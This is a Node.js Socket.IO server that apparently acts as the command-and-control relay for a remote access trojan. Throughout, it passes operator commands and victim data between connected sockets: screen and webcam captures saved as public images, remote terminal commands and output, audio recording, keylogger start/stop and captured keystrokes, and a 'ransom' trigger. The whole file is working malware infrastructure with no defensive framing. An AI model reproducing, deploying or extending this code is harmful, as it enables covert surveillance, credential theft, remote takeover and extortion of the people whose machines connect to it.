const express = require("express")
const http = require('http')
const socketIO = require('socket.io')
const path = require('path')

const fs = require('fs')
const app = express()
const server = http.createServer(app)
const io = socketIO(server)

app.use(express.static(path.join(__dirname,'public')))


io.on("connection", socket => {
    console.log("CONNECTION")
    
    socket.on("request", data => {
        
        //io.to(socket.id)
        socket.broadcast.emit("screen",data)
        
    })
    socket.on("image" ,data => {
        
        const buff = Buffer.from(data.buffer,'base64')
        fs.writeFile('public/routes/test.jpeg', buff, (err,data)=> {
            if(err){
                console.log(err)
            }
        })
        socket.broadcast.emit("imagerequest",data)
    })

    socket.on("terminal", data => {
        socket.broadcast.emit("command", data)
    })
    
    socket.on("stdout", data => {
        socket.broadcast.emit("stdoutrequest", data)
    })
    socket.on("reqrecord", data =>{
        socket.broadcast.emit("record","true")
    })
    socket.on('record', data => {
        socket.broadcast.emit("resrecord", data)
    })
   
    socket.on("webCrequest", data => {
        
        //io.to(socket.id)
        socket.broadcast.emit("webcam",data)
        
    })
    socket.on("webimage" ,data => {
        
        const buff = Buffer.from(data.buffer,'base64')
        fs.writeFile('public/routes/webtest.jpeg', buff, (err,data)=> {
            if(err){
                console.log(err)
            }
        })
        socket.broadcast.emit("webimagerequest",data)
    })
    
    socket.on("keyloggReq", data => {
        if (data === 'start') {
            socket.broadcast.emit("keylog","start")
        }else if(data == 'stop'){
            socket.broadcast.emit("keylog","stop")
        }
        

    })
    socket.on("key", data => {
        console.log(data)
        socket.broadcast.emit("keyRes",{succes:true, key: data.key})
    })
    socket.on("ransomReq", data => {
        console.log(data)
        socket.broadcast.emit("ransom",data)
    })
    
})


const PORT = process.env.PORT || 3000;

server.listen(PORT, () => console.log(`Server running on port ${PORT}`))